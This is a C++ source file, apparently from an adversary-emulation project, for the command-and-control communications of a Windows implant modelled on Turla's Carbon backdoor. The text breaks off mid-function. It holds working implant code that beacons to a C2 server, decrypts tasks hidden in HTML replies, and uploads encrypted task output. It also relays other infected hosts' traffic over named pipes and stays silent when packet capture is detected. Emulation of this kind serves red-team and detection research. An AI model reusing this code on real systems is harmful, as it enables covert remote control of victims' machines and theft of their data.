#include <string>
#include <vector>
#include <iostream>
#include <fstream>
#include <ctime>
#include <tuple>
#include <future>
#include <mutex>
#include "CommLib.hpp"
#include "configFile.h"
#include "HttpClient.hpp"
#include "Tasks.hpp"
#include "EncUtils.hpp"
#include "Config.hpp"
#include "Util.hpp"
#include "Logging.hpp"

bool commLibTestingMode = FALSE;
std::mutex m_http_conn;

CommLib::CommLib (std::string configFile): configurationFileLocation(configFile) {};

std::vector<std::shared_ptr<networkAddress>> CommLib::GetNetworkAddresses(WinApiWrapperInterface* api_wrapper) {
    // List to return
    std::vector<std::shared_ptr<networkAddress>> serverAddresses;
    
    // First look for the "quantity" field in CW_INET
    auto numberServersAsString = getValueFromConfigFile(api_wrapper, SECTION_CW_INET, "quantity", "0");
    // Convert to a number
    int addrIdxMax = std::stoi(numberServersAsString);                  // TODO check for errors
    
    // For every number+1 in range, look for field "addressNUM".
    for (int addrIdx = 1; addrIdx <= addrIdxMax; addrIdx++){
        
        // For each result string- parse to network address. 
        auto currentAddress = getValueFromConfigFile(api_wrapper, SECTION_CW_INET, "address" + std::to_string(addrIdx));
        if (currentAddress.compare("") != 0){
            auto newAddress = stringToNetworkAddress(currentAddress);
            if (newAddress != nullptr && newAddress.get() != nullptr){
                auto [addr, port, resource] = *(newAddress.get());
                serverAddresses.push_back(newAddress);
            }
            
        }
    }

    // Return this list of values
    return serverAddresses;
};

bool CommLib::FetchConfiguration(WinApiWrapperInterface* api_wrapper) {
    /** Getting values from config file **/

    // Get C2 server address
    auto c2ServerAddresses = GetNetworkAddresses(api_wrapper);
    c2ServerAddress = c2ServerAddresses[std::rand() % c2ServerAddresses.size()];
    if (c2ServerAddress == nullptr) {
        logging::LogMessage(api_wrapper, LOG_CORE, LOG_LEVEL_ERROR, "Unable to extract C2 address");
        return false;
    }
    auto[ addr, port, c2_server_resource ] = *c2ServerAddress.get();
    resourcePath = c2_server_resource;

    // Get internet timeout value. Default is 10 minutes
    auto timeMaxString = getValueFromConfigFile(api_wrapper, SECTION_TIME, "trans_timemax", "10");
    maxTransTime = std::stoi(timeMaxString);                                    // TODO- Error check

    // Get victim uuid from config file object_id field.
    if (victimUuid.length() == 0) {
        victimUuid = getValueFromConfigFile(api_wrapper, SECTION_NAME, "object_id", DEFAULT_VICTIM_UUID);
    }

    return true;
};

/*
 * CommLib::p2pSetup
 *      About:
 *          Set up the named pipe peer to peer configuration
 *      Result:
 *          Returns true on success, otherwise false.
 *      MITRE ATT&CK Techniques:
 *          T1090.001: Proxy: Internal Proxy
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 *          https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
 */
bool CommLib::p2pSetup(WinApiWrapperInterface* api_wrapper) {
    // Get victim uuid from config file object_id field.
    if (victimUuid.length() == 0) {
        victimUuid = getValueFromConfigFile(api_wrapper, SECTION_NAME, "object_id", DEFAULT_VICTIM_UUID);
        logging::LogMessage(api_wrapper, LOG_CORE, LOG_LEVEL_INFO, "Set victim UUID to " + victimUuid);
    }

    // Determine if the implant is configured to run in p2p named pipe mode
    std::string enabled_str = getValueFromConfigFile(api_wrapper, SECTION_TRANSPORT, "p2p_client", "false");
    p2pModeEnabled = enabled_str == "true" || enabled_str == "yes";

    // Get pipe names
    std::string localPipeName = getValueFromConfigFile(api_wrapper, SECTION_TRANSPORT, "system_pipe", DEFAULT_PIPE_NAME);
    localPipeAddress = "\\\\.\\pipe\\" + localPipeName;
    
    peerPipeAddress = getValueFromConfigFile(api_wrapper, SECTION_TRANSPORT, "peer_pipe", "");
    if (peerPipeAddress.length() == 0 && p2pModeEnabled) {
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "P2p mode enabled, but no peer pipe provided.");
        return FALSE;
    }
    
    // Get hostname to build response pipe path
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    if (api_wrapper->GetComputerNameWrapper(buffer, &size)) {
        responsePipeAddress = "\\\\" + std::string(buffer) + "\\pipe\\" + localPipeName;
    } else {
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to get computer name. Error code: " + std::to_string(api_wrapper->GetLastErrorWrapper()));
        return FALSE;
    }

    logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_DEBUG, "Local p2p pipe: " + localPipeAddress);
    logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_DEBUG, "Response pipe: " + responsePipeAddress);
    logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_DEBUG, "Peer p2p pipe: " + peerPipeAddress);

    // Open pipe handle for listening pipes
    DWORD error_code;
    h_local_pipe = comms_pipe::CreatePermissivePipe(api_wrapper, localPipeAddress, &error_code);
    if (h_local_pipe == INVALID_HANDLE_VALUE) {
        logging::LogMessage(
            api_wrapper, 
            LOG_P2P_HANDLER, 
            LOG_LEVEL_ERROR, 
            "Failed to open handle to local p2p pipe " + localPipeAddress + ". Error code: " + std::to_string(error_code)
        );
        return FALSE;
    } 

    return TRUE;
}

/*
 * CommLib::EstablishServerConnection
 *      About:
 *          Establish initial connection with the C2 server.
 *      Result:
 *          Returns pointer to an HttpConnection object on success, nullptr on failure.
 *      MITRE ATT&CK Techniques:
 *          T1071.001: Application Layer Protocol: Web Protocols
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
std::shared_ptr<HttpConnection> CommLib::EstablishServerConnection(WinApiWrapperInterface* api_wrapper) {
    /** Start talking to C2 host. **/

    // If no server address set, run fetchConfiguration.
    if (c2ServerAddress == nullptr) FetchConfiguration(api_wrapper);

    // If server address still not set, return false
    if (c2ServerAddress == nullptr) {
        return nullptr;
    }

    // Send a GET request for the root page to see if successful
    auto [ addr, port, resource] = *(c2ServerAddress.get());
    auto httpConnection = std::make_shared<HttpConnection>(addr, port, victimUuid, userAgent);
    
    if (httpConnection == nullptr || !httpConnection->IsValid(api_wrapper)){
        return nullptr;
    }
    
    // Set timeout
    httpConnection->SetTimeout(api_wrapper, maxTransTime);

    // Root page for heartbeat
    bool replied = httpConnection->MakeSimpleConnection(api_wrapper, "/");

    // If no response, return false.
    if (!replied) {
        return nullptr;
    }
    resourcePath = resource;

    if (!httpConnection->IsValid(api_wrapper)){
        return nullptr;
    }
    
    // Set timeout
    httpConnection->SetTimeout(api_wrapper, maxTransTime);
    
    // If no packet capture is detected, send new request to server to establish a session and check if new tasks are available.
    if (!isPacketCaptureOnSystem()) {
        logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_INFO, "Set HTTP connection for " + addr + ":" + std::to_string(port) + ", useragent " + userAgent);
        return httpConnection;
    }
    return nullptr;
};

std::shared_ptr<Task> CommLib::convertP2pResponseToTask(std::vector<char> reply_data) {
    size_t task_data_len = reply_data.size();
    if (task_data_len > 0) {
        std::shared_ptr<byte[]> task_data = std::make_shared<byte[]>(task_data_len);
        for (size_t i = 0; i < task_data_len; i++) {
            task_data[i] = (byte)reply_data[i];
        }
        return std::make_shared<Task>(task_data, task_data_len, CarbonLocation);
    } else {
        return nullptr;
    }
}

/*
 * CommLib::EstablishServerSession
 *      About:
 *          Send an HTTP beacon to the C2 server. The server response is an HTML page that may contain encrypted and base64-encoded
 *          tasking information embedded within the HTML.
 *          Decodes and decrypts the server response to obtain the underlying task information.
 *      Result:
 *          Returns Task information on success, nullptr on failure.
 *      MITRE ATT&CK Techniques:
 *          T1071.001: Application Layer Protocol: Web Protocols
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1573.002: Encrypted Channel: Asymmetric Cryptography
 *          T1140: Deobfuscate/Decode Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
std::shared_ptr<Task> CommLib::EstablishServerSession(WinApiWrapperInterface* api_wrapper, std::shared_ptr<HttpConnection> httpConnection, std::string uuid_override){        
    if (httpConnection == nullptr) {
        logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_ERROR, "HttpConnection is null. Cannot make session.");
        return nullptr;
    }
    std::string uuid_val = uuid_override.length() == 0 ? victimUuid : uuid_override;
    auto httpSession = httpConnection->StartSession(api_wrapper, resourcePath, uuid_val);

    if (httpSession == nullptr){
        logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_ERROR, "Could not start full session.");
        return nullptr;
    }

    std::string reply;
    logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_DEBUG, "Setting cookie to " + uuid_val);

    // Critical section
    {
        std::lock_guard<std::mutex> lock(m_http_conn);

        // Set cookie data for uuid
        if (!httpConnection->setCookie(PHPSESSID, uuid_val, false)) {
            logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_ERROR, "Could not set cookie. Error code: " + std::to_string(api_wrapper->GetLastErrorWrapper()));
            return nullptr;
        }
        
        if (!httpSession->ValidSession(api_wrapper)){
            logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_ERROR, "Session was not valid.");
            return nullptr;
        }
        reply = httpSession->GetData(api_wrapper);
    } // Critical section

    size_t min_size = replyStart.size() + nameAssignmentHttp.size() + valueAssignmentHttp.size();
    if (reply.size() < min_size) {
        logging::LogMessage(
            api_wrapper, 
            LOG_HTTP_CLIENT, 
            LOG_LEVEL_ERROR, 
            "Http reply was too short, it was " + std::to_string(reply.size()) + ", must be at least " + std::to_string(min_size)
        );
        return nullptr;
    }

    // Extra out data from input tag
    std::string value_tag_value = GetValueTagValue(reply);
    if (value_tag_value.length() == 0) {
        logging::LogMessage(
            api_wrapper, 
            LOG_HTTP_CLIENT, 
            LOG_LEVEL_DEBUG,
            "Value tag was not available, got:  " + reply
        );
        return nullptr;
    }

    // Decode the data from the input tag
    auto [decoded_value, decoded_value_len] = decodeValue(value_tag_value);

    // Decrypt decoded value to get task info
    if (rsa_enc::rsa_private_key_base64.length() > 0) {
        auto [task_data, task_data_len] = DecryptServerTaskResp(api_wrapper, decoded_value, decoded_value_len);
        return std::make_shared<Task>(task_data, task_data_len, CarbonLocation);
    }
    
    return std::make_shared<Task>(decoded_value, decoded_value_len, CarbonLocation);
}

/*
*   Functions supporting DLL task run
*/

/*
 * FindNewTasks
 *      About:
 *          Periodically sends an HTTP beacon to the C2 server. The server response is an HTML page that may contain encrypted and base64-encoded
 *          tasking information embedded within the HTML.
 *          Decodes and decrypts the server response to obtain the underlying task information.
 *          Saves CAST-128 encrypted task information on disk.
 *      MITRE ATT&CK Techniques:
 *          T1071.001: Application Layer Protocol: Web Protocols
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1573.002: Encrypted Channel: Asymmetric Cryptography
 *          T1140: Deobfuscate/Decode Files or Information
 *          T1027: Obfuscated Files or Information
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
void FindNewTasks(WinApiWrapperInterface* api_wrapper, std::shared_ptr<CommLib> commLib, std::shared_ptr<HttpConnection> httpConnection){
    while (true){
        auto newTask = commLib->EstablishServerSession(api_wrapper, httpConnection, commLib->victimUuid);
        if (newTask != nullptr) {
            logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_DEBUG, "Received task from C2 server.");
            newTask->SaveTask(api_wrapper);
            logging::LogMessage(api_wrapper, LOG_HTTP_CLIENT, LOG_LEVEL_DEBUG, "Saved task from C2 server.");
        }
        if (commLibTestingMode) {
            break;
        }
        std::this_thread::sleep_for(serverRequestInterval);
    }
}

/*
 * ReportFinishedTasks
 *      About:
 *          Periodically checks for pending task output. 
 *          Decrypts output and uploads it to the C2 server via HTTP POST request.
 *          POST data is CAST-128 encrypted and then base-64 encoded.
 *      MITRE ATT&CK Techniques:
 *          T1071.001: Application Layer Protocol: Web Protocols
 *          T1140: Deobfuscate/Decode Files or Information
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1132.001: Data Encoding: Standard Encoding
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
void ReportFinishedTasks(WinApiWrapperInterface* api_wrapper, std::shared_ptr<CommLib> commLib, std::shared_ptr<HttpConnection> httpConnection, std::string httpResource){
    while (true) {
        auto tasksCreated = TaskReport::getReportableTasks(api_wrapper, finishedTasks);
        if (tasksCreated.size() > 0) {
            logging::LogMessage(api_wrapper, LOG_TASKING, LOG_LEVEL_DEBUG, "Found task output to send to server.");
            
            for (auto taskReport: tasksCreated){
                if (taskReport != nullptr) {
                    // Critical section
                    {
                        std::lock_guard<std::mutex> locK(m_http_conn);
                        if (!httpConnection->setCookie(PHPSESSID, commLib->victimUuid, false)) {
                            logging::LogMessage(
                                api_wrapper, 
                                LOG_HTTP_CLIENT, 
                                LOG_LEVEL_ERROR,
                                "Could not set cookie. Error code: " + std::to_string(api_wrapper->GetLastErrorWrapper())
                            );
                            continue;
                        }
                        taskReport->SendToC2Server(api_wrapper, httpConnection, httpResource);
                    } // Critical section

                    logging::LogMessage(api_wrapper, LOG_TASKING,  LOG_LEVEL_DEBUG, "Uploaded task output to server.");
                }
            }
        }
        if (commLibTestingMode) {
            break;
        }
        std::this_thread::sleep_for(taskFinishCheckInterval); 
    }
}

DWORD GetAndProcessP2pBeaconResp(WinApiWrapperInterface* api_wrapper, std::shared_ptr<CommLib> comm_lib) {
    comms_pipe::PipeMessage resp_msg = comms_pipe::PipeMessage();
    DWORD result = ERROR_SUCCESS;

    // Listen on local pipe for beacon response from peer
    if (!api_wrapper->ConnectNamedPipeWrapper(comm_lib->h_local_pipe, NULL)) {
        result = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to wait for pipe connection. Error code: " + std::to_string(result));
        return result;
    }
    logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_DEBUG, "Received connection from peer.");
    result = comms_pipe::GetPipeMsg(api_wrapper, comm_lib->h_local_pipe, &resp_msg, TRUE);
    if (result != ERROR_SUCCESS) {
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to read response from peer. Error code: " + std::to_string(result));
        if (!api_wrapper->DisconnectNamedPipeWrapper(comm_lib->h_local_pipe)) {
            result = api_wrapper->GetLastErrorWrapper();
            logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to disconnect pipe. Error code: " + std::to_string(result));
        }
        return result;
    }
    if (!api_wrapper->DisconnectNamedPipeWrapper(comm_lib->h_local_pipe)) {
        result = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to disconnect pipe. Error code: " + std::to_string(result));
        return result;
    }
    logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_DEBUG, "Received beacon response message.");

    // Process beacon response
    if (resp_msg.data.size() > 0) {
        auto receivedTask = comm_lib->convertP2pResponseToTask(resp_msg.data);
        if (receivedTask != nullptr) {
            logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_INFO, "Received task from peer.");
            receivedTask->SaveTask(api_wrapper);
            logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_INFO, "Saved task from peer.");
        } else {
            logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_INFO, "Received empty task from peer.");
        }
    }
    return ERROR_SUCCESS;
}

DWORD sendTaskOutputAndHandleResp(WinApiWrapperInterface* api_wrapper, std::shared_ptr<CommLib> comm_lib, std::shared_ptr<TaskReport> taskReport) {
    comms_pipe::PipeMessage task_output_resp_msg = comms_pipe::PipeMessage();
    DWORD result;
    auto [data, dataLength] = taskReport->BuildBlob(api_wrapper);
    std::vector<char> taskData(dataLength);
    for (int i = 0; i < dataLength; i++) {
        taskData[i] = (char)data[i];
    }
    result = comms_pipe::SendTaskOutput(
        api_wrapper, 
        util::ConvertStringToWstring(comm_lib->peerPipeAddress).c_str(), 
        comm_lib->victimUuid, 
        comm_lib->responsePipeAddress,
        taskData,
        TRUE
    );
    if (result != ERROR_SUCCESS) {
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to send task output to peer. Error code: " + std::to_string(result));
        return result;
    }
    logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_INFO, "Sent task output to peer");

    // Listen on local pipe for task output response from peer
    if (!api_wrapper->ConnectNamedPipeWrapper(comm_lib->h_local_pipe, NULL)) {
        result = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to wait for peer connection. Error code: " + std::to_string(result));
        return result;
    }
    logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_DEBUG, "Received peer connection");
    result = comms_pipe::GetPipeMsg(api_wrapper, comm_lib->h_local_pipe, &task_output_resp_msg, TRUE);
    if (result != ERROR_SUCCESS) {
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to read response from peer. Error code: " + std::to_string(result));
        if (!api_wrapper->DisconnectNamedPipeWrapper(comm_lib->h_local_pipe)) {
            result = api_wrapper->GetLastErrorWrapper();
            logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to disconnect pipe. Error code: " + std::to_string(result));
        }
        return result;
    }
    if (!api_wrapper->DisconnectNamedPipeWrapper(comm_lib->h_local_pipe)) {
        result = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to disconnect pipe. Error code: " + std::to_string(result));
        return result;
    }

    logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_DEBUG, "Received task output response message.");
    if (task_output_resp_msg.message_type == PIPE_MSG_ERROR_RESP) {
        std::string error_msg(task_output_resp_msg.data.begin(), task_output_resp_msg.data.end());
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Received task output error response from peer: " + error_msg);
        return FAIL_PIPE_TASK_OUTPUT_ERROR_RESP;
    } else {
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_INFO, "Peer successfully handled task output.");
    }
    return ERROR_SUCCESS;
}

/*
 * p2pClientCoreLoop
 *      About:
 *          Sends beacons and task output to upstream peer. Encrypts peer-to-peer comms with CAST128.
 *      MITRE ATT&CK Techniques:
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1090.001: Proxy: Internal Proxy
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
void p2pClientCoreLoop(WinApiWrapperInterface* api_wrapper, std::shared_ptr<CommLib> comm_lib) {
    while (true) {
        // Send beacon request to peer
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_DEBUG, "Sending beacon request to peer.");
        DWORD result = comms_pipe::SendBeaconRequest(
            api_wrapper, 
            util::ConvertStringToWstring(comm_lib->peerPipeAddress).c_str(), 
            comm_lib->victimUuid, 
            comm_lib->responsePipeAddress,
            TRUE
        );
        if (result != ERROR_SUCCESS) {
            logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to send beacon request to peer pipe " + comm_lib->peerPipeAddress + ". Error code: " + std::to_string(result));
            api_wrapper->SleepWrapper(PIPE_CLIENT_DEFAULT_SLEEP_MS);
            if (commLibTestingMode) break;
            continue;
        }
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_INFO, "Sent beacon request to peer.");

        // Handle beacon response
        result = GetAndProcessP2pBeaconResp(api_wrapper, comm_lib);
        if (result != ERROR_SUCCESS) {
            logging::LogMessage(
                api_wrapper,
                LOG_P2P_HANDLER,
                LOG_LEVEL_ERROR,
                "Failed to get and handle beacon response from peer pipe " + comm_lib->peerPipeAddress + ". Error code: " + std::to_string(result)
            );
            api_wrapper->SleepWrapper(PIPE_CLIENT_DEFAULT_SLEEP_MS);
            if (commLibTestingMode) break;
            continue;
        }
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_INFO, "Handed beacon response from peer. Checking for task output.");
        
        // Check if there is task output to upload
        auto tasksCreated = TaskReport::getReportableTasks(api_wrapper, finishedTasks);
        for (auto taskReport: tasksCreated){
            // Send task output to peer
            if (taskReport != nullptr) {
                result = sendTaskOutputAndHandleResp(api_wrapper, comm_lib, taskReport);
                if (result != ERROR_SUCCESS) {
                    logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to send and process task output. Error code: " + std::to_string(result));
                    continue;
                }
            }
        }
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_INFO, "Handled task output. Sleeping.");

        if (commLibTestingMode) break;

        // Sleep
        api_wrapper->SleepWrapper(PIPE_CLIENT_DEFAULT_SLEEP_MS);
    }
}

DWORD HandleP2pClientBeaconReq(
    WinApiWrapperInterface* api_wrapper, 
    std::shared_ptr<CommLib> comm_lib,
    comms_pipe::PipeMessage* msg,
    std::shared_ptr<HttpConnection> httpConnection
) {
    std::vector<char> forwarded_response;
    logging::LogMessage( api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_DEBUG, "Forwarding peer beacon request to c2 server on behalf of peer " + msg->client_id);
    auto httpSession = httpConnection->StartSession(api_wrapper, comm_lib->resourcePath, msg->client_id);
    if (httpSession == nullptr) {
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Could not start full HTTP session on behalf of p2p client");
        comms_pipe::SendErrorResp(
            api_wrapper, 
            util::ConvertStringToWstring(msg->response_pipe_path).c_str(), 
            "Could not start full HTTP session.",
            TRUE
        );
        return FAIL_START_HTTP_SESSION;
    }

    bool valid_session = FALSE;
    std::string reply;
    
    // Critical section
    {
        // Set cookie for client
        std::lock_guard<std::mutex> lock(m_http_conn);
        if (!httpConnection->setCookie(PHPSESSID, msg->client_id, false)) {
            logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Could not set cookie for peer. Error code: " + std::to_string(api_wrapper->GetLastErrorWrapper()));
            return FAIL_SET_COOKIE;
        }
        valid_session = httpSession->ValidSession(api_wrapper);
        if (valid_session) {
            reply = httpSession->GetData(api_wrapper);
        }            
    } // Critical section

    if (!valid_session) {
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Invalid HTTP session for p2p client");
        comms_pipe::SendErrorResp(
            api_wrapper, 
            util::ConvertStringToWstring(msg->response_pipe_path).c_str(), 
            "Invalid HTTP session.",
            TRUE
        );
        return FAIL_START_HTTP_SESSION;
    }
    
    if (reply.size() < replyStart.size() + nameAssignmentHttp.size() + valueAssignmentHttp.size()) {
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Bad response from server for p2p client");
        comms_pipe::SendErrorResp(
            api_wrapper, 
            util::ConvertStringToWstring(msg->response_pipe_path).c_str(), 
            "Bad response from server.",
            TRUE
        );
        return FAIL_BAD_HTTP_RESP;
    }

    // Decode/decrypt server response before forwarding to peer
    std::string value_tag_value = GetValueTagValue(reply);
    if (value_tag_value.length() == 0) {
        return comms_pipe::SendBeaconResp(
            api_wrapper, 
            util::ConvertStringToWstring(msg->response_pipe_path).c_str(), 
            std::vector<char>(0),
            TRUE
        );
    }

    auto [decoded_value, decoded_value_len] = decodeValue(value_tag_value);

    // Decrypt decoded value to get task info
    if (rsa_enc::rsa_private_key_base64.length() > 0) {
        auto [task_data, task_data_len] = DecryptServerTaskResp(api_wrapper, decoded_value, decoded_value_len);
        forwarded_response = std::vector<char>(task_data.get(), task_data.get() + task_data_len);
    } else {
        forwarded_response = std::vector<char>(decoded_value.get(), decoded_value.get() + decoded_value_len);
    }
    
    // Take c2 server response, package into p2p resp message, connect to client response pipe, send resp message
    logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_DEBUG, "Forwarding beacon response to peer at pipe: " + msg->response_pipe_path);
    return comms_pipe::SendBeaconResp(
        api_wrapper, 
        util::ConvertStringToWstring(msg->response_pipe_path).c_str(), 
        forwarded_response,
        TRUE
    );
}

DWORD handleP2pClientMessage(
    WinApiWrapperInterface* api_wrapper, 
    std::shared_ptr<CommLib> comm_lib,
    comms_pipe::PipeMessage* msg,
    std::shared_ptr<HttpConnection> httpConnection
) {
    if (msg->message_type == PIPE_MSG_BEACON) {
        // If message is a beacon request, forward beacon to c2 server
        return HandleP2pClientBeaconReq(api_wrapper, comm_lib, msg, httpConnection);
    } else if (msg->message_type == PIPE_MSG_TASK_OUTPUT) {
        // if message contains task output, forward to c2 server
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_INFO, "Received task output from peer " + msg->client_id);
        auto httpSession = httpConnection->StartSession(api_wrapper, comm_lib->resourcePath, msg->client_id);
        if (httpSession == nullptr) {
            logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Could not start full HTTP session on behalf of p2p client");
            comms_pipe::SendErrorResp(
                api_wrapper, 
                util::ConvertStringToWstring(msg->response_pipe_path).c_str(), 
                "Could not start full HTTP session.",
                TRUE
            );
            return FAIL_START_HTTP_SESSION;
        }

        bool send_data_success = FALSE;

        // Encrypt and base64 encode output before sending to c2 server
        std::vector<char> encrypted_data = cast128_enc::Cast128Encrypt(msg->data, cast128_enc::kCast128Key);
        std::string encoded_ciphertext_str = encodeData((byte*)&encrypted_data[0], encrypted_data.size());
        std::vector<char> encoded_ciphertext(encoded_ciphertext_str.begin(), encoded_ciphertext_str.end());

        // Critical section
        {
            std::lock_guard<std::mutex> lock(m_http_conn);
            if (!httpConnection->setCookie(PHPSESSID, msg->client_id, false)) {
                logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Could not set cookie for peer. Error code: " + std::to_string(api_wrapper->GetLastErrorWrapper()));
                return FAIL_SET_COOKIE;
            }
            send_data_success = httpSession->SendData(api_wrapper, &(encoded_ciphertext[0]), (DWORD)encoded_ciphertext.size());
        } // Critical section

        if (send_data_success) {
            logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_DEBUG, "Forwarded task output from peer.");
            return comms_pipe::SendTaskOutputResp(
                api_wrapper, 
                util::ConvertStringToWstring(msg->response_pipe_path).c_str(), 
                std::vector<char>(),
                TRUE
            );
        } else {
            logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Could not send task output on behalf of p2p client.");
            comms_pipe::SendErrorResp(
                api_wrapper, 
                util::ConvertStringToWstring(msg->response_pipe_path).c_str(), 
                "Failed to send task output on behalf of client.",
                TRUE
            );
            return FAIL_RELAY_TASK_OUTPUT;
        }
    } else {
        // Unsupported message type
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Received unsupported message type " + std::to_string(msg->message_type) + " from peer " + msg->client_id);
        return comms_pipe::SendErrorResp(
            api_wrapper, 
            util::ConvertStringToWstring(msg->response_pipe_path).c_str(), 
            "Invalid message type " + std::to_string(msg->message_type),
            TRUE
        );
    }
}

/*
 * p2pListenerCoreLoop
 *      About:
 *          Receives peer-to-peer messages from downstream peer and handles them accordingly. Encrypts peer-to-peer comms with CAST128.
 *      MITRE ATT&CK Techniques:
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *          T1090.001: Proxy: Internal Proxy
 *      CTI:
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */
void p2pListenerCoreLoop(
    WinApiWrapperInterface* api_wrapper, 
    std::shared_ptr<CommLib> comm_lib, 
    std::shared_ptr<HttpConnection> httpConnection
) {
    DWORD result;
    while (true) {
        comms_pipe::PipeMessage client_msg = comms_pipe::PipeMessage();

        // Wait for client to connect to pipe
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_DEBUG, "Waiting for client connections.");
        if (!api_wrapper->ConnectNamedPipeWrapper(comm_lib->h_local_pipe, NULL)) {
            result = api_wrapper->GetLastErrorWrapper();
            logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to wait for client connection. Error code: " + std::to_string(result));
            if (commLibTestingMode) break;
            continue;
        }
        logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_DEBUG, "Received client connection.");

        // Read client message
        result = comms_pipe::GetPipeMsg(api_wrapper, comm_lib->h_local_pipe, &client_msg, TRUE);
        if (result != ERROR_SUCCESS) {
            logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to read message from client. Error code: " + std::to_string(result));
            if (!api_wrapper->DisconnectNamedPipeWrapper(comm_lib->h_local_pipe)) {
                result = api_wrapper->GetLastErrorWrapper();
                logging::LogMessage(api_wrapper, LOG_P2P_HANDLER, LOG_LEVEL_ERROR, "Failed to disconnect pipe. Error code: " + std::to_string(result));
            }
            if (commLibTestingMode) break;
            continue;
        }
        if (!api_wrapper->DisconnectNamedPipeWrapper(comm_lib->h_local_pipe)) {
